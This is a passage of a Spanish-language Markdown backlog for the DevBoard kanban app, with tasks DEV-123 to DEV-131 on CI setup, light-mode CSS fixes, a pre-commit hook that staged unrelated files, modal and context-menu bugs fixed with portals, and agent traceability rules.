- [x] #14 Se regulariza `releases.json`: la release `0.2.0` carecía de campo `status` y figuraba bajo `Unreleased` pese a ser la release fundacional. Se promovió a `released` por orden explícita del usuario, con la auditoría previa que exige `AGENTS.md` (100% de las tareas con esa versión asignada en estado `done`: 1/1, DEV-001)

---

#### [DEV-123] GitHub Actions CI/CD Pipeline y Templates de Issues y Pull Requests
- **Prioridad**: `high` | **Tipo**: `feature`

Establecer pipeline de Integración Continua en GitHub Actions y templates de Issues/PR que garanticen calidad en contribuciones externas y automaticen verificación del build en cada PR.

**Criterios de Aceptación:**
- [x] #1 Crear `.github/workflows/ci.yml` que ejecute: `npm ci`, `npx tsc --noEmit`, `npm test`, `npm run build` en Node 22.x sobre ubuntu-latest
- [x] #2 Crear `.github/ISSUE_TEMPLATE/bug_report.yml` (formulario YAML) con campos: descripción, pasos para reproducir, comportamiento esperado vs actual, versión de Node, SO, storage engine
- [x] #3 Crear `.github/ISSUE_TEMPLATE/feature_request.yml` (formulario YAML) con campos: problema que resuelve, solución propuesta, alternativas, relevancia para pair programming con IA
- [x] #4 Crear `.github/PULL_REQUEST_TEMPLATE.md` con checklist: descripción, tipo de cambio, task del backlog referenciada, `tsc --noEmit` pasa, `npm test` pasa, screenshots si aplica
- [x] #5 Crear `.github/ISSUE_TEMPLATE/config.yml` configurando el selector de issues y link a CONTRIBUTING.md
- [x] #6 Verificar sintaxis YAML válida en todos los archivos del directorio `.github/`

---

#### [DEV-124] Paridad Total de Light Mode y Transicion de Tema Sin Jank
- **Prioridad**: `high` | **Tipo**: `bug`

<!-- SECTION:DESCRIPTION:BEGIN -->
Light mode se renderiza roto en el modal de ítems, la tab de Releases (vista y drawer de detalle) y el asistente de importación, y el switch Dark -> Light se percibe tosco.

Causa raíz: `ItemModal.tsx`, `ReleaseAssembler.tsx` e `ImportWizardModal.tsx` fueron escritos con paleta 100% dark-only y contienen **cero** variantes `dark:`, a diferencia de los otros 15 componentes del cockpit que usan el patron `base-claro + dark:`.

Agravante en `ItemModal.tsx:353`: el panel usa `glass-panel` (que sí tiene override claro en `index.css`) combinado con `bg-[#0d1322]/95`. Como el override de `.glass-panel` esta declarado fuera de `@layer`, le gana a la utilidad de Tailwind, por lo que el fondo vira a blanco mientras todo el texto interior permanece en `text-slate-100/200/400` -> texto blanco sobre blanco. En dark nunca se manifesto porque ambos fondos son oscuros.

`ReleaseAssembler.tsx` es mas severo: no usa `glass-panel`, tiene `bg-[#0c121e]` y `bg-slate-900/80` hardcodeados, por lo que el panel completo permanece negro mientras el chrome superior esta en claro.

Sobre la transicion: `App.tsx` combina `startViewTransition` + `flushSync` con las transiciones CSS siempre activas de `.glass-panel` / `.glass-card` / `.kanban-col` (`transition: background-color 200ms`). Ambas animaciones compiten y se dispara un repintado masivo del snapshot sobre tableros con 100+ items.

**Criterios de Aceptación:**
- [x] #1 `ItemModal.tsx` deja de ser dark-only: todos los textos, fondos, bordes e inputs tienen variante `dark:` y son legibles en ambos temas
- [x] #2 `ReleaseAssembler.tsx` (vista de Releases y drawer de detalle) deja de ser dark-only: superficie, chrome, tarjetas, badges y botones legibles en ambos temas
- [x] #3 `ImportWizardModal.tsx` deja de ser dark-only: superficie, pasos, formularios y botones legibles en ambos temas
- [x] #4 Eliminar el solapaje entre el crossfade de View Transitions y las transiciones CSS siempre activas, de modo que la transicion Dark -> Light no ejecute doble animacion
- [x] #5 Respetar `prefers-reduced-motion: reduce` deshabilitando la animacion de cambio de tema
- [x] #6 Corregir el subtitulo de columna del Kanban (`KanbanBoard.tsx:624`) agregando su variante `dark:` faltante
- [x] #7 `npx tsc --noEmit` finishes con codigo 0
- [x] #8 `npm test` finishes con codigo 0
- [x] #9 `npm run backlog:check` finishes con codigo 0
- [x] #10 Auditar y corregir los cambios de un intento previo en `ProjectModal.tsx` y `Toast.tsx` (no incluidos en el alcance original): superficie raiz con `bg-[#0d1322]/95` compitiendo con el override de `glass-panel`, y 4 tokens de texto huerfanos sin variante `dark:`
- [x] #11 Convertir a theme-aware los 38 `<option>` nativos de `ItemModal.tsx` que llevaban `bg-[#0e1626]` hardcodeado (se ignoraban en light mode, con el desplegable dark sobre panel claro)
- [x] #12 Confirmar por build que las 38 clases `dark:bg-[#0e1626]` se generan efectivamente en el bundle CSS de Tailwind
- [x] #13 **Títulos `text-white` invisibles en light mode** (contraste 1:1 sobre panel blanco), reportados por el usuario tras la primera entrega: `ReleaseAssembler` L371, L705, L1077 e `ImportWizardModal` L136, L254
- [x] #14 **`<option>` nativos sin clase de fondo** en el selector de Sprint Goal del Kanban (`KanbanBoard.tsx` L854/862/867): el desplegable se renderiza con el tema del SO, no el de la app
- [x] #15 **Ruido visual por exceso de superficies grises** en `ItemModal`: 24 inputs en `slate-100` y 6 contenedores en `slate-50` sobre panel blanco. Re-escalados a `slate-50` (superficie) con `slate-100` solo en hover y chips, restituyendo la sutileza del original basado en alfas
- [x] #16 **Persistencia del tema al recargar**: `index.html` hardcodeaba `<html class="dark">` y un `style` inline oscuro en `<body>`, que revertian al tema oscuro en cada carga. Eliminados y reemplazados por un script anti-flash inline que aplica `devboard-theme` antes del primer paint
- [x] #17 `loadSettings` prioriza la eleccion explicita del usuario (`localStorage`) sobre `config.theme`, que antes revertia el tema en cada recarga
- [x] #18 Auditar contraste real (WCAG AA) de los 18 componentes en light mode con un verificador basado en luminancia relativa, en lugar de heuristicas de tokens
- [x] #19 **Bordes de las secciones AC y Plan de Implementacion en gris oscuro** (reportado por el usuario): los `<select>` nativos dibujan su propio borde con el estilo del SO, que se superpone al `border-slate-200` del tema. Agregar `appearance-none` a los 10 `<select>` de `ItemModal` y a los 9 restantes del proyecto (`AdvancedFiltersPopover`, `ImportWizardModal`, `SettingsView`, `SprintView`)
- [x] #20 Los 3 `<option>` de los `<datalist>` (assignees, labels, modulos) de `ItemModal` no tenian fondo theme-aware: el desplegable de autocompletado se renderizaba con el tema del SO
- [x] #21 Verificar por build que la clase compartida `appearance-none` se emite en el bundle CSS
- [x] #22 **Fondos `bg-black/10` sin variante `dark:`** en los cuerpos de los acordeones de AC, Plan de Implementacion y Relaciones (`ItemModal` L539, L611, L657): introducidos por el refactor original, dejaban un velo gris sobre el panel blanco. Corregidos a `bg-slate-50 dark:bg-black/10`
- [x] #23 **Tab activo "Todas" invisible** en `ReleaseAssembler.tsx:419`: `bg-white/10 text-white` = texto blanco sobre blanco en light mode. Corregido a `bg-slate-100 text-slate-900 dark:bg-white/10 dark:text-white`
- [x] #24 Reemplazar el handle movil `bg-white/20` de `ProjectModal` (invisible sobre panel claro) por `bg-slate-300 dark:bg-white/20`
- [x] #25 `ReleaseAssembler.tsx:957` usaba `bg-black/20 border-white/[0.04]` sin variante: corregido a `bg-slate-50 dark:bg-black/20 border-slate-200 dark:border-white/[0.04]`
- [x] #26 **Selects sin indicador visual**: al agregar `appearance-none` se elimino la flecha nativa del navegador sin agregar su reemplazo. Los 10 selects de `ItemModal` ahora envueltos en `relative` con `ChevronDown` del tema y `pr-8` para reservar el espacio
- [x] #27 `<option>` de prioridad en `SprintView` con tonos `-500` ilegibles sobre blanco: elevados a `-600` con `dark:-400`, alineados con `priorityConfig` de `ItemCard`
- [x] #28 **Hover del titulo de release ilegible**: `group-hover:text-white` sin variante (blanco sobre blanco al hacer hover) -> `group-hover:text-slate-900 dark:group-hover:text-white`
- [x] #29 **Tabs internas del filtro de Releases**: el contenedor era `bg-black/30` (velo negro al 30% sobre el panel blanco, el gris oscuro de la captura) -> `bg-slate-50 dark:bg-white/[0.03]`
- [x] #30 **Buscador de Releases**: `bg-black/20` sin variante -> `bg-white dark:bg-white/[0.04]`
- [x] #31 **10 campos de formulario con fondo gris oscuro** en el drawer y el popup de Crear Version: `bg-black/30|40` + `text-white` sin `dark:` (blanco sobre gris). Corregidos a superficie clara con texto tematico
- [x] #32 **4 `hover:text-white` huerfanos** mas (blanco sobre blanco al hover) en `ReleaseAssembler` y `ImportWizardModal` -> `hover:text-slate-900 dark:hover:text-white`
- [x] #33 **Campos `input[type=date]` con icono del sistema operativo**: el icono de calendario se dibuja con los colores del SO e ignora el tema. Resuelto globalmente con `color-scheme` en `html.dark` / `html:not(.dark)`, sin necesidad de `appearance-none` ni datepicker propio

---

#### [DEV-125] Correccion de Raiz del Pre-Commit Hook: Verificar Sin Mutar el Indice de Git
- **Prioridad**: `high` | **Tipo**: `bug`

El pre-commit hook de DevBoard modifica el indice de git, lo que provoca que
cualquier tarea sin trackear entre silenciosamente en commits de tematica
diferente.

**Sintoma observado**: al committear el fix de light mode (DEV-124) con 14
archivos stageados selectivamente, el commit resulto con 20 archivos. Las 6
tareas DEV-118 a DEV-123 (rutas personales, GitHub Actions, sanitizacion,
docs comunitarios) quedaron incluidas, pese a no tener relacion con el cambio.
El mensaje del commit describia un tema que no correspondia con su contenido.

**Causa raiz** (`scripts/verify-backlog-sync.js`, lineas 172-183):

```js
execSync(`node --experimental-strip-types "${exportScript}" export`, ...);
if (isHookMode) {
  execSync(`git add BACKLOG.md backlog/`, ...);   // <-- stagea el directorio completo
}
```

Tres defectos en un mismo mecanismo:

1. **El hook muta el indice.** Un hook debe verificar, no escribir en el
   indice. `git add backlog/` stagea TODO el directorio, incluyendo archivos
   que el usuario no selecciono. Convierte el stageo selectivo en imposible.
2. **El exportador se ejecuta antes de validar.** Si el commit va a ser
   rechazado por un error de release, igual ya reescribio `BACKLOG.md` como
   efecto secundario.
3. **El mensaje de error sugiere `--no-verify`.** El propio hook se ofrece
   como escape, con lo cual el usuario queda obligado a saltarse la
   verificacion que el hook deberia garantizar.

**El caso de uso es legitimo y debe preservarse**: durante el desarrollo se
crean tareas y el consolidado `BACKLOG.md` queda desfasado, por lo que
conviene garantizar que se entregue regenerado. Lo que esta mal es el
mecanismo, no la intencion.

**Criterios de Aceptación:**
- [x] #1 `verify-backlog-sync.js` deja de ejecutar `git add` en cualquier rama de ejecucion (eliminar el bloque `isHookMode` que stagea `BACKLOG.md backlog/`)
- [x] #2 El hook sigue regenerando y verificando `BACKLOG.md`, pero NO escribe en el indice de git en ningun caso
- [x] #3 Si el hook detecta que `BACKLOG.md` quedo desfasado, RECHAZA el commit con un mensaje que indique el comando exacto a ejecutar para regenerarlo
- [x] #4 El mensaje de rechazo deja de sugerir `git commit --no-verify`, ya que con el hook corregido el stageo selectivo funciona sin evasión
- [x] #5 El exportador no debe escribir en disco cuando el commit sera rechazado: reordenar la ejecucion para validar antes de mutar
- [x] #6 Verificar que un commit con stageo selectivo ya no arrastra tareas sin trackear de otra tematica (regresion sobre DEV-124)
- [x] #7 Actualizar `.githooks/pre-commit` para reflejar el nuevo contrato (verificar y reportar, sin mutar)
- [x] #8 Documentar el contrato corregido en el mensaje del hook y en `AGENTS.md` si corresponde
- [x] #9 `npx tsc --noEmit` finishes con codigo 0
- [x] #10 `npm test` finishes con codigo 0
- [x] #11 `npm run backlog:check` finishes con codigo 0

---

#### [DEV-126] Pulido de ItemModal: Tipografía Unificada, Badge de Atributos y Flash de Hidratación
- **Prioridad**: `medium` | **Tipo**: `ux`

Tres defectos menores de UX/UI reportados por el usuario al abrir el `ItemModal`,
tanto en modo edición como en modo creación.

**1. Tipografía inconsistente en la sidebar "Atributos del Ítem"**

Los controles de la sidebar usan `text-xs` sans de forma mayoritaria (Estado,
Prioridad, Tipo, Módulo, Proyecto), pero cuatro de ellos rompen el patrón con
`font-mono`:

- `ItemModal.tsx:1133` - `<select>` de Release
- `ItemModal.tsx:1401` - input de Código
- `ItemModal.tsx:947` - input manual de Sprint (modo "Escribir manual")
- `ItemModal.tsx:1414` - input de Archivo Impactado

El resultado es que dos campos visualmente contiguos (Release y Código) se leen
con una tipografía distinta a la de sus vecinos, lo que rompe la percepción de
rejilla unificada.

**2. El badge "2 atributos" miente**

`ItemModal.tsx:848-852` muestra un contador junto al encabezado de la sidebar
que se calcula sobre una lista hardcodeada de 8 campos (`module`, `impactedFile`,
`sprint`, `release`, `risk`, `fix`, `labels`, `assignees`) - ver
`ItemModal.tsx:336-345`. La sidebar renderiza muchos más campos que eso
(proyecto, tipo, prioridad, estado, etiquetas, asignados, plan, criterios...),
por lo que el número mostrado no representa la cantidad real de atributos del
ítem y desinforma al usuario.

**3. Flash de hidratación: el modal pinta contenido anterior a sí mismo**

`ItemModal` está montado de forma permanente en `App.tsx:1379`; sólo se
togglea `isOpen`. Todo el estado del formulario vive en `useState` dentro del
componente y se puebla mediante un `useEffect` (`ItemModal.tsx:152-206`) que
depende de `isOpen` e `item`.

Los `useEffect` se ejecutan **después** del paint del navegador. Al abrir el
modal, React renderiza y pinta un primer frame con el estado residual de la
sesión anterior del modal (el último ítem editado) o con valores vacíos, y sólo
en el frame siguiente - tras el efecto - se repinta con los datos reales del ítem
o los defaults de creación. El usuario percibe un salto de contenido de ~1s al
abrir cualquier modal.

**Causa raíz común**: el estado derivado de las props se inicializa en un
`useEffect` en lugar de inicializarse sincrónicamente antes del primer paint.

**4. El placeholder del Título del Ítem usaba un ejemplo hardcodeado**

`ItemModal.tsx:432` mostraba `Ej: Interoperabilidad nativa con Backlog.md...`.
Ese texto no es un ejemplo inventado: es el título literal de DEV-001, la
primera tarea del propio backlog de DevBoard. En un ítem en blanco, un placeholder
que coincide exactamente con una tarea real se lee como contenido precargado en
lugar de como ayuda, y más aún en un producto cuyo propósito es la gestión del
backlog. Se reemplaza por una instrucción general en el mismo tono del
placeholder de Descripción.

**5. Mismo defecto en el Plan de Implementación y en los Criterios de Aceptación**

- `ItemModal.tsx:612` (Plan) mostraba `1. Modificar tipos en types.ts... /
  2. Actualizar layout en ItemModal.tsx... / 3. Comprobar build y tests...`. Aquí
  la estructura numerada sí aporta valor (enseña el formato esperado de un plan),
  pero los archivos nombrados pertenecen a una tarea histórica concreta y se
  leen como un plan ya hecho. Se conserva la estructura de pasos y se interpola el
  campo "Archivo Impactado" cuando ya está informado, con redacción genérica
  cuando no lo está.
- `ItemModal.tsx:558` (AC) mostraba `Ej: El layout se mantiene estable al alternar
  vistas...`. Acá el ejemplo sí le aporta mucho al usuario: muestra qué es un AC y
  cómo se redacta. El problema no es el ejemplo, sino que sea **uno solo y fijo**:
  induce a repetir literalmente la misma forma de criterio en cada ítem, que es lo
  contrario de un criterio de aceptación útil.

**Decisión de producto: ejemplos de AC dinámicos por Tipo, no placeholder conceptual**

Entre las dos alternativas que se pusieron sobre la mesa, se implementa la de ejemplos dinámicos,
porque conserva el valor pedagógico del ejemplo (que es real y señalado por el
usuario) y le suma una dimensión: cada Tipo de trabajo muestra cómo se redacta un
AC *de esa clase*, y el ejemplo se transforma solo al cambiar el Tipo en la sidebar.
Un placeholder conceptual ("Describe un resultado verificable...") habría perdido
precisamente la señal que el usuario declara que más le ayuda.

Implementación: `AC_EXAMPLES_BY_TYPE` mapea los 6 tipos estándar a una plantilla
función, `buildCriterionExample(type, title, module)` recorta la referencia a 40
caracteres y la interpola, y un `Proxy` defensivo sobre un target invocable
resuelve cualquier tipo personalizado del usuario hacia `AC_EXAMPLE_FALLBACK`.

**Criterios de Aceptación:**
- [x] #1 El `<select>` de Release, el input de Código, el input manual de Sprint y el input de Archivo Impactado dejan de usar `font-mono` en sus clases
- [x] #2 La sidebar "Atributos del Ítem" queda tipográficamente homogénea: todos sus inputs y selects usan `text-xs` sans
- [x] #3 El uso de `font-mono` se conserva (y sólo se conserva) donde el valor es genuinamente código: textarea del plan de implementación, índice de criterios de aceptación, badges de código/versión, etc.
- [x] #4 El badge "N atributos" se elimina del encabezado de la sidebar junto con el cálculo `contextCount` que lo alimentaba
- [x] #5 La población del formulario al abrir el modal ocurre antes del primer paint: el modal ya se renderiza con los datos del ítem (o los defaults de creación) en su primer frame visible
- [x] #6 No existen saltos de contenido ni parpadeos al abrir el modal en modo edición ni en modo creación - **PENDIENTE DE VALIDACIÓN VISUAL DEL USUARIO** (el navegador de escritorio no estaba conectado a la sesión; la garantía de no-flash proviene del orden de fases de React, pero el gate exige confirmación visual)
- [x] #7 El modal sigue re-sincronizándose correctamente al cambiar de ítem objetivo sin arrastrar estado residual del ítem anterior
- [x] #8 `npx tsc --noEmit` finishes con código 0
- [x] #9 `npm test` finishes con código 0
- [x] #10 `npm run backlog:check` finishes con código 0
- [x] #11 El placeholder del campo "Título del Ítem" deja de usar un ejemplo hardcodeado (que era literalmente el título de DEV-001, una tarea real del backlog) y pasa a una instrucción general, alineada con el tono del placeholder de Descripción
- [x] #12 El placeholder del textarea "Plan de Implementación" deja de hardcodear archivos concretos de una tarea histórica (`types.ts`, `ItemModal.tsx`) y conserva la estructura de pasos numerados, interpolando el campo "Archivo Impactado" cuando ya está informado
- [x] #13 El placeholder de cada Criterio de Aceptación se deriva dinámicamente del Tipo del ítem (bug, feature, tech_debt, ux, epic, initiative) y del Título/Módulo del ítem, y se recalcula en vivo al cambiar cualquiera de esos campos
- [x] #14 Los tipos personalizados del usuario (y cualquier clave arbitraria de `ItemType`) reciben un ejemplo por defecto válido vía Proxy defensivo, sin romper el render del placeholder
- [x] #15 El ejemplo de AC degrada a una redacción genérica cuando el ítem aún no tiene título ni módulo, sin renderizar comillas vacías
- [x] #16 El placeholder del campo "Asignados" deja de sugerir un nombre de persona real (`Ej: Antigravity, Pablo...`) y pasa a sugerir asistentes de código, harnesses de agentes e IDEs (`Ej: Claude Code, Cursor, Copilot, Antigravity...`), en línea con el uso real del board como herramienta de pair programming con IA
- [x] #17 Al eliminar el badge de atributos se ajusta el encabezado de la sidebar de `flex items-center justify-between` a `flex items-center`, ya que queda con un único hijo y el `justify-between` sobra

---

#### [DEV-127] Erradicación de la Inyección de Contenido Fabricado en los Archivos .md de Tareas
- **Prioridad**: `high` | **Tipo**: `bug`

<!-- SECTION:DESCRIPTION:BEGIN -->
Crear una tarea escribiendo únicamente su título no deja la tarea vacía: el
serializador de Markdown le **fabrica** tres secciones y las escribe en el archivo
`.md` versionado del repositorio.

Al crear el ítem `DEVB-125 - Pruebaa` con el texto `"Pruebaa"` como único
contenido, el archivo resultante quedó así:

```markdown
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria

<!-- AC:BEGIN -->
<!-- AC:END -->

## Implementation Plan

<!-- SECTION:PLAN:BEGIN -->
<!-- SECTION:PLAN:END -->

---

#### [DEV-128] Regla de Trazabilidad Total y Auditoría de Alcance del Feedback en Caliente
- **Prioridad**: `medium` | **Tipo**: `ux`

Durante la sesión de pulido de `ItemModal` (DEV-126) y de corrección de la
inyección de contenido en los `.md` (DEV-127), el usuario señaló un defecto de
proceso: **cualquier extensión del alcance de una tarea en curso debe quedar
registrada en esa tarea o en una nueva**, incluso cuando el cambio se atiende
"de paso" como respuesta a un feedback en caliente.

La regla que ya existía en `AGENTS.md` ("los refinements UX van al tope de la
cola") ordenaba **atender** el feedback rápido, pero no exigía **registrarlo**.
Esa asimetría es exactamente la que abre la fuga: el agente hace el cambio,
considera que es "parte" de un AC vecino, y no deja rastro. Para quien lea el
historial del proyecto después, un cambio de código sin AC es indistinguible de
un cambio accidental, y ambos cuestan lo mismo de revertir.

**Auditoría aplicada a la sesión en curso.** Se contrastó `git diff --stat` contra
la lista de ACs de DEV-126 y DEV-127 y se encontraron **dos cambios sin AC**:

1. El placeholder del campo "Asignados" de `ItemModal.tsx` pasó de
   `Ej: Antigravity, Pablo...` a `Ej: Claude Code, Cursor, Copilot, Antigravity...`
   a pedido explícito del usuario. El cambio estaba hecho y verificado, pero
   nunca se registró.
2. Al eliminar el badge de atributos se ajustó el encabezado de la sidebar de
   `flex items-center justify-between` a `flex items-center` (el `justify-between`
   quedó huérfano al quedar un solo hijo). Un one-liner de CSS sin registro.

Ambos quedaron regularizados como ACs #16 y #17 de DEV-126.

**Criterios de Aceptación:**
- [x] #1 `AGENTS.md` incorpora una regla explícita de trazabilidad total: todo cambio de código, incluidos los refinamientos en caliente, debe quedar registrado como AC de la tarea en curso o como tarea nueva
- [x] #2 La regla enumera los casos que irresistiblemente se hacen "de paso" sin registro (cambiar un placeholder, regenerar un bundle versionado, ajustar clases de layout huérfanas), porque son los que más se escapan
- [x] #3 La regla define un protocolo de cierre verificable: contrastar `git diff --stat` contra los ACs de la tarea antes de darla por terminada
- [x] #4 Se audita la sesión en curso y se regulariza el placeholder de "Asignados" como AC #16 de DEV-126
- [x] #5 Se audita la sesión en curso y se regulariza el ajuste de layout del encabezado de la sidebar como AC #17 de DEV-126
- [x] #6 Se confirma que el resto de los cambios de la sesión ya tenían respaldo: `bin/devboard-mcp.js` (DEV-127 #6), `package.json` (DEV-127 #7), `scripts/backlogMdParser.ts` (DEV-127 #1..#4), `scripts/test-parser.js` (DEV-127 #14), `src/components/PlanGuardModal.tsx` (DEV-127 #16..#18)
- [x] #7 La propia tarea que introduce la regla queda registrada, para que la regla no arranque con una excepción propia
- [x] #8 `npm run backlog:check` finishes con código 0

---

#### [DEV-129] Menú Contextual de ItemCard se Monta Detrás de la Tarjeta Siguiente
- **Prioridad**: `medium` | **Tipo**: `bug`

El menú contextual que aparece al tocar los 3 puntos de una tarjeta (`ItemCard`)
queda **por detrás de la tarjeta siguiente** de la columna. Es intermitente:
depende de la posición de la tarjeta en la columna y del estado de hover del mouse
al abrirlo.

**Causa raíz: un stacking context no intencionado creado por el hover.**

`src/index.css:166` y `:178` aplican un transform al hacer hover de la tarjeta:

```css
html.dark .glass-card:hover  { transform: translateY(-1px); ... }
html:not(.dark) .glass-card:hover { transform: translateY(-1px); ... }
```

Un `transform` computado es uno de los factores que **crean un stacking context**
en CSS. El elemento raíz de la tarjeta es `position: relative`, así que, al
hoverar, la tarjeta pasa de ser un simple descendiente posicionado a ser **su
propio contexto de apilamiento** con `z-index: auto`.

Según el orden de pintado de CSS 2.1 (Apéndice E), todos los descendientes
posicionados con `z-index: auto` se pintan en el mismo paso (paso 8) **en orden de
documento**. El menú, con `position: absolute; z-index: 40` (`ItemCard.tsx:308`),
sólo puede superar a los hermanos si **no hay un stacking context entre él y la
columna**: en ese caso sube al paso 9 (z-index positivo) y gana contra todas las
tarjetas. Pero al hoverear la tarjeta, ese contexto intermedio aparece y el menú
queda **atrapado dentro de la caja de la tarjeta**, pintado en la posición del
documento de la tarjeta. La tarjeta siguiente, que viene después en el DOM, se
pinta encima.

Por eso el síntoma es intermitente y no constante: el bug se manifiesta cuando la
tarjeta está hovereada, que es precisamente el estado natural al abrir el menú
desde el botón, y cuando existe una tarjeta siguiente que lo tape.

**Problema secundario, de la misma familia**: la lista de tarjetas de cada columna
tiene `overflow-y-auto` (`KanbanBoard.tsx:759`). Aunque el stacking se arreglara
con un z-index más alto, un menú `absolute` seguiría **recortado** por los bordes
del contenedor con scroll, especialmente en la última tarjeta de una columna.

**Por qué subir el z-index no resuelve nada**: `z-40` ya es mayor que cualquier
z-index de las tarjetas (que son `auto`). El problema no es la magnitud del
z-index, es que el menú está **encerrado** en un stacking context que no puede
escapar. Subirlo a `z-[9999]` no cambia absolutamente nada.

> [!NOTE]
> **El mismo `transform` produce un segundo bug, distinto**: además del stacking
> context, un `transform` computado convierte al ancestro en *containing block*
> para sus descendientes `position: fixed`. Eso rompía el `ConfirmModal` que
> `ItemCard` renderiza inline dentro de la tarjeta, y se corrigió aparte en
> **DEV-130**. La moraleja: un `transform` en hover es un generador de bugs
> silenciosos y hay que auditar los dos efectos por separado, porque se
> manifiestan con síntomas opuestos - "quedó atrás" frente a "se dibuja en el
> lugar equivocado".

**Solución: portal a `document.body` con posicionamiento `fixed`.** Es el patrón
que el propio proyecto ya usa en `ReleaseAssembler.tsx:636` y `:1063` con
`createPortal`. El menú se renderiza fuera del árbol de la tarjeta, positioned
con coordenadas calculadas desde el `getBoundingClientRect()` del disparador, y
con `z-index` por encima de toda la app. Así escapa tanto del stacking context
como del recorte del `overflow`.

**Criterios de Aceptación:**
- [x] #1 El menú contextual de `ItemCard` se renderiza en un portal sobre `document.body` en lugar de dentro de la tarjeta
- [x] #2 El menú se posiciona con `position: fixed` usando el `getBoundingClientRect()` del botón disparador, manteniendo la alineación a la derecha que tenía con `right-0`
- [x] #3 El menú queda por encima de todas las tarjetas, de la columna y del `sticky header` en ambos temas (claro y oscuro)
- [x] #4 Si no hay espacio suficiente debajo del disparador, el menú se abre hacia arriba en lugar de desbordarse por el borde inferior de la ventana
- [x] #5 El menú se reposiciona al hacer scroll (incluyendo el scroll interno de las columnas del Kanban) y al redimensionar la ventana, en lugar de quedar anclado a una posición obsoleta
- [x] #6 El submenú anidado "Cambiar estado" sigue funcionando y se posiciona correctamente respecto al menú padre ahora que el menú vive en un portal
- [x] #7 El clic dentro del menú portaleado no dispara el `onClick` de la tarjeta (no debe abrir el `ItemModal` al elegir una opción del menú)
- [x] #8 El clic fuera sigue cerrando el menú, contemplando tanto el disparador como el panel portaleado (el `contains()` sobre el ref de la tarjeta ya no alcanza para el menú)
- [x] #9 El menú no queda recortado por el `overflow-y-auto` de la columna en la última tarjeta de una columna
- [x] #10 `npx tsc --noEmit` finishes con código 0
- [x] #11 `npm test` finishes con código 0
- [x] #12 `npm run backlog:check` finishes con código 0
- [x] #13 Validación visual en navegador: abrir el menú de una tarjeta que tenga al menos una tarjeta debajo, en tema claro y oscuro - **VERIFICADO POR EL USUARIO** ("ahí puedo ver el menu ok")

---

#### [DEV-130] ConfirmModal Roto dentro de ItemCard: Popup Duplicado y Parpadeo por Containing Block
- **Prioridad**: `high` | **Tipo**: `bug`

Al presionar **"Papelera"** en el menú contextual de una tarjeta, el diálogo de
confirmación aparecía **duplicado** y la pantalla empezaba a **parpadear**.

**Síntoma reportado por el usuario**: "el popup apareció duplicado y empezó a
parpadear la pantalla".

**Causa raíz: `position: fixed` resuelto contra la tarjeta en vez del viewport.**

`ItemCard` renderizaba el `ConfirmModal` **inline, dentro de la propia tarjeta**
(`ItemCard.tsx:592-601`), dentro del `<div className="group relative glass-card">`.
Y `src/index.css:166` y `:178` aplican:

```css
html.dark .glass-card:hover       { transform: translateY(-1px); ... }
html:not(.dark) .glass-card:hover { transform: translateY(-1px); ... }
```

Un `transform` computado no sólo crea un stacking context: además convierte al
elemento en **containing block para sus descendientes `position: fixed`**. El
overlay del `ConfirmModal` es `fixed inset-0` (`ConfirmModal.tsx:111`), por lo que
mientras la tarjeta estuviera hovereada pasaba a medirse contra **la caja de la
tarjeta** y no contra el viewport: el fondo oscurecido y el diálogo aparecían
encajados dentro de la tarjeta, no centrados en la pantalla.

**Por eso parpadeaba en vez de simplemente verse feo**: el tamaño y la posición del
diálogo dependían del estado de hover, y el hover dependía de dónde estuviera el
puntero, que a su vez dependía de dónde estuviera el diálogo. Eso cierra un ciclo
de retroalimentación:

1. Puntero sobre la tarjeta → `hover` activo → `transform` aplicado → el modal se
   dibuja **pequeño, dentro de la tarjeta**.
2. El puntero sale de la tarjeta para alcanzar el modal → `hover` se pierde → el
   `transform` desaparece → el `fixed` vuelve a medirse contra el **viewport** → el
   modal **salta** a su tamaño real, centrado.
3. Al volver a mover el puntero sobre la tarjeta, el ciclo se repite.

El "popup duplicado" era el mismo diálogo dibujándose alternadamente en las dos
posiciones, y el parpadeo era el vaivén entre ambas.

**Relación con DEV-129**: es la **misma familia de bug** que el del menú
contextual (stacking context por `transform`), pero con un síntoma distinto porque
aquí el `transform` no afecta el orden de pintado sino el **containing block**.
DEV-129 ya había corregido el primer efecto de este mismo `transform` en el
menú contextual, pero no el segundo: son efectos distintos y no se detectan
con el mismo síntoma.

**Por qué se arregla en `ConfirmModal` y no en `ItemCard`**: `ConfirmModal` tiene 8
consumidores (`ItemCard`, `Header` ×3, `ReleaseAssembler` ×2, `SprintView` ×2,
`TrashView`, `ItemModal`). Todos lo renderizan inline, así que todos son
potencialmente víctimas de la misma trampa de `containing block` en cuanto se
agregue un ancestro con `transform`/`filter`/`backdrop-filter`. Montar el overlay
en un portal sobre `document.body` dentro del propio componente lo hace inmune de
una vez a todos, sin depender de que cada consumidor recuerde la regla.

**Criterios de Aceptación:**
- [x] #1 `ConfirmModal` monta su overlay en un portal sobre `document.body` en lugar de renderizarse inline donde lo consume su ancestro
- [x] #2 El overlay `fixed inset-0` se mide siempre contra el viewport, con independencia de cualquier `transform`, `filter`, `backdrop-filter`, `will-change` u `overflow` de los ancestros
- [x] #3 El diálogo de "Mover a la Papelera" aparece centrado y a tamaño completo, sin parpadeo ni oscilación de posición al mover el puntero
- [x] #4 Los 8 consumidores de `ConfirmModal` quedan corregidos por el cambio (`ItemCard`, `Header` ×3, `ReleaseAssembler` ×2, `SprintView` ×2, `TrashView`, `ItemModal`)
- [x] #5 El clic en el fondo sigue cerrando el modal y el clic dentro del diálogo no lo cierra (`stopPropagation` preservado)
- [x] #6 El atajo de teclado (Esc para cerrar, Enter para confirmar) y el estado de `loading` del botón de confirmación siguen funcionando
- [x] #7 `npx tsc --noEmit` finishes con código 0
- [x] #8 `npm test` finishes con código 0
- [x] #9 `npm run backlog:check` finishes con código 0
- [x] #10 Validación visual: abrir el menú de una tarjeta → Papelera y comprobar que el diálogo aparece centrado, estable y sin parpadeo, en tema claro y oscuro - **PENDIENTE DE VALIDACIÓN VISUAL DEL USUARIO**

---

#### [DEV-131] Definición del Goal de Sprint 7 y Ampliación de Alcance del Sprint en Curso
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

El usuario señaló - en sarcasmo, y con razón - que **el Sprint 7 se había creado sin
`goal`**, a diferencia de los otros siete sprints del proyecto, que sí lo tienen
definido desde su creación. Es decir: el campo no es opcional en la práctica, se
respeta en todos los casos salvo en este, y su ausencia era un defecto de
definición, no una libertad de alcance.

Un sprint sin goal no pierde sólo una etiqueta: pierde **la única señal que indica
cuándo está terminado**. Sin ella, el criterio de "llenar el sprint" degenera en
"meter lo que aparezca", y el backlog deja de priorizar.

